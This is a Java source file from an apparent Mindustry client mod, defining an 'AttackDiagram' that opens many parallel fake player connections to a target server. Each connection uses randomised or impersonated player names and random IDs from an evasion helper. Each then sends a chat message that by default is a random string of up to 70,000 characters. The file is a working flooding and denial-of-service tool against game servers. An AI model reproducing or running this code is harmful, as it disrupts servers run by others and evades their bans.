/*
 * Copyright 2021 Itzbenz
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package Ozone.Experimental;

import Atom.String.WordGenerator;
import Atom.Utility.Pool;
import Atom.Utility.Random;
import Atom.Utility.Utility;
import Ozone.Experimental.Evasion.Identification;
import Ozone.Gen.Callable;
import Ozone.Internal.InformationCenter;
import Ozone.Net.OzoneFrameworkNetProvider;
import Ozone.Patch.Translation;
import arc.func.Cons;
import arc.func.Prov;
import arc.graphics.Color;
import arc.net.*;
import arc.struct.IntMap;
import arc.struct.ObjectMap;
import arc.struct.Queue;
import arc.struct.Seq;
import arc.util.Log;
import arc.util.io.ReusableByteOutStream;
import arc.util.io.Writes;
import arc.util.pooling.Pools;
import mindustry.core.Version;
import mindustry.gen.Groups;
import mindustry.gen.Player;
import mindustry.net.*;
import org.jetbrains.annotations.Nullable;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;

import static mindustry.Vars.maxNameLength;
import static mindustry.Vars.maxTextLength;

//Pure madness
//TODO fuck it
public class ConnectDiagram extends AttackDiagram {
	public String ip, sup;
	public int port, maxThread;
	public boolean join;
	protected Queue<Future<?>> taskList = new Queue<>();
	
	public ConnectDiagram() {
	
	}
	
	public ConnectDiagram(String ip, int port, String suprise, int maxThread, boolean enableJoinMessage) {
		this.ip = ip;
		this.port = port;
		sup = suprise;
		join = enableJoinMessage;
		this.maxThread = maxThread;
	}
	
	public static Packets.ConnectPacket randomConnectPacket() {
		Packets.ConnectPacket c = new Packets.ConnectPacket();
		Player p = null;
		if (Groups.player.size() > 2) p = Random.getRandom(Groups.player);
		c.name = p == null ? (Random.getBool() ? Utility.capitalizeEnforce(WordGenerator.newWord(Random.getInt(5, maxNameLength))) : WordGenerator.newWord(Random.getInt(5, maxNameLength))) : p.name + Translation.getRandomHexColor();
		c.name += "[]";
		c.locale = null;//lol no
		c.mods = new Seq<>();
		c.mobile = Random.getBool();
		c.versionType = Version.type;
		c.color = p == null ? Color.valueOf(Random.getRandomHexColor()).rgba() : p.color.rgba();
		c.usid = Identification.getRandomUID();
		c.uuid = Identification.getRandomUID();
		return c;
	}
	
	int i = 0;
	int last = i;
	
	public static Future<?> summonDiagram(String ip, int port, ConnectDiagram some, Consumer<ConnectDiagramProvider> payload) {
		return Pool.submit(() -> {
			ConnectDiagramProvider p = new ConnectDiagramProvider(some);
			p.payload = payload;
			p.disconnectClient();
			AtomicBoolean b = new AtomicBoolean(false);
			p.connectClient(ip, port, () -> {
				if (payload == null) p.disconnectClient();
				b.set(true);
			}, () -> {
				b.set(true);
			});
			while (!b.get()) {
				try { Thread.sleep(100); }catch (Throwable ignored) { }
			}
			p.dispose();
		});
	}
	
	@Override
	public void run() {
		while (taskList.size < maxThread) {
			i++;
			taskList.addLast(summonDiagram(ip, port, this, null));
		}
		
		Future<?> f = taskList.first();
		try {
			if (f.isDone()) taskList.removeFirst();
		}catch (Throwable ignored) {
			taskList.removeFirst();
		}
		if (last != i) {
			Log.info("Queue: @", i);
			last = i;
		}
	}
	
	public static class ConnectDiagramProvider extends OzoneFrameworkNetProvider {
		private final IntMap<Streamable.StreamBuilder> streams = new IntMap<>();
		private final Seq<Object> packetQueue = new Seq<>();
		private final ObjectMap<Class<?>, Cons> clientListeners = new ObjectMap<>();
		private final ReusableByteOutStream OUT = new ReusableByteOutStream(8192);
		private final Writes WRITE = new Writes(new DataOutputStream(OUT));
		private Client client;
		public Callable call;
		private Runnable suc = null;
		private boolean clientLoaded, connecting;
		public Net net;
		public Consumer<ConnectDiagramProvider> payload;
		@Nullable
		private ConnectDiagram cd;
		
		public ConnectDiagramProvider(@Nullable ConnectDiagram cc) {
			cd = cc;
			net = new Net(this);
			call = new Callable(net);
			Prov<DatagramPacket> packetSupplier = () -> new DatagramPacket(new byte[512], 512);
			client = new Client(8192, 8192, new ArcNetProvider.PacketSerializer());
			client.setDiscoveryPacket(packetSupplier);
			client.addListener(new NetListener() {
				@Override
				public void connected(Connection connection) {
					Packets.Connect c = new Packets.Connect();
					c.addressTCP = connection.getRemoteAddressTCP().getAddress().getHostAddress();
					if (connection.getRemoteAddressTCP() != null)
						c.addressTCP = connection.getRemoteAddressTCP().toString();
					handleClientReceived(c);
				}
				
				@Override
				public void disconnected(Connection connection, DcReason reason) {
					Packets.Disconnect c = new Packets.Disconnect();
					c.reason = reason.toString();
					handleClientReceived(c);
				}
				
				@Override
				public void received(Connection connection, Object object) {
					if (object instanceof FrameworkMessage) return;
					handleClientReceived(object);
				}
			});
			handleClient(Packets.Connect.class, packet -> {
				Log.debug("Connecting to server: @", packet.addressTCP);
				sendClient(randomConnectPacket(), Net.SendMode.tcp);
			});
			handleClient(Packets.Disconnect.class, packet -> {
				Log.debug("Disconnecting @", packet.reason);
				disconnectClient();
			});
			handleClient(Packets.WorldStream.class, data -> {
				Log.debug("Received world data: @ bytes.", data.stream.available());
				clientLoaded = true;
				if (cd != null) {
					if (cd.sup.isEmpty() || cd.sup.length() > maxTextLength) sendChat("");
					else sendChat(cd.sup);
					if (cd.join) call.connectConfirm();
				}else {
					sendChat("");
					call.connectConfirm();
				}
				if (payload != null) payload.accept(this);
				suc.run();
			});
		}
		

		public void sendChat(String s) {
			//Call.sendChatMessage(s);
			mindustry.net.Packets.InvokePacket packet = arc.util.pooling.Pools.obtain(mindustry.net.Packets.InvokePacket.class, mindustry.net.Packets.InvokePacket::new);
			packet.priority = (byte) 0;
			packet.type = (byte) 44;
			OUT.reset();
			if (s.isEmpty()) s = Random.getString(maxTextLength, Random.getInt(200, 70000));
			else if (s.length() < maxTextLength - 20) s = Translation.getRandomHexColor() + s;
			mindustry.io.TypeIO.writeString(WRITE, s);
			packet.bytes = OUT.getBytes();
			packet.length = OUT.size();
			sendClient(packet, mindustry.net.Net.SendMode.tcp);
		}
		
		public <T> void handleClient(Class<T> type, Cons<T> listener) {
			clientListeners.put(type, listener);
		}
		
		public void handleClientReceived(Object object) {
			if (object instanceof Packets.StreamBegin) {
				streams.put(((Packets.StreamBegin) object).id, new Streamable.StreamBuilder((Packets.StreamBegin) object));
				
			}else if (object instanceof Packets.StreamChunk) {
				Streamable.StreamBuilder builder = streams.get(((Packets.StreamChunk) object).id);
				if (builder == null) {
					return;
				}
				builder.add(((Packets.StreamChunk) object).data);
				if (builder.isDone()) {
					streams.remove(builder.id);
					handleClientReceived(builder.build());
				}
			}else if (clientListeners.get(object.getClass()) != null) {
				
				if (clientLoaded || ((object instanceof Packet) && ((Packet) object).isImportant())) {
					if (clientListeners.get(object.getClass()) != null) {
						clientListeners.get(object.getClass()).get(object);
					}
					Pools.free(object);
				}else if (!((object instanceof Packet) && ((Packet) object).isUnimportant())) {
					packetQueue.add(object);
				}else {
					Pools.free(object);
				}
			}else {
				if (object instanceof Packets.InvokePacket) {
					Log.debug("Invoke Packet: " + InformationCenter.getPacketNameClientReceive(((Packets.InvokePacket) object).type));
					return;
				}
				Log.debug("Unhandled packet type: '@'!", object);
			}
			
			
		}
		
		public boolean isConnecting() {
			return connecting;
		}
		
		public void connectClient(String ip, int port, Runnable success, Runnable fail) {
			connecting = true;
			Pool.daemon(() -> {
				try {
					suc = success;
					//just in case
					client.stop();
					
					Pool.daemon(() -> {
						try {
							client.run();
						}catch (Exception ignored) {
						
						}
					}).start();
					
					client.connect(5000, ip, port, port);
					
				}catch (Throwable e) {
					disconnectClient();
					fail.run();
				}
			}).start();
		}
		
		@Override
		public void connectClient(String ip, int port, Runnable success) {
			throw new IllegalAccessError("no");
		}
		
		@Override
		public void sendClient(Object object, Net.SendMode mode) {
			try {
				if (mode == Net.SendMode.tcp) {
					client.sendTCP(object);
				}else {
					client.sendUDP(object);
				}
				//sending things can cause an under/overflow, catch it and disconnect instead of crashing
			}catch (Throwable t) {
				disconnectClient();
			}
			Pools.free(object);
		}
		
		@Override
		public void disconnectClient() {
			client.close();
			clientLoaded = false;
			connecting = false;
		}
		
		@Override
		public void discoverServers(Cons<Host> callback, Runnable done) {
		}
		
		
		@Override
		public void hostServer(int port) throws IOException {
		
		}
		
		@Override
		public Iterable<? extends NetConnection> getConnections() {
			return null;
		}
		
		@Override
		public void closeServer() {
		
		}
		
		@Override
		public void dispose() {
			disconnectClient();
			closeServer();
			try {
				client.dispose();
			}catch (IOException ignored) {
			}
		}
	}
}
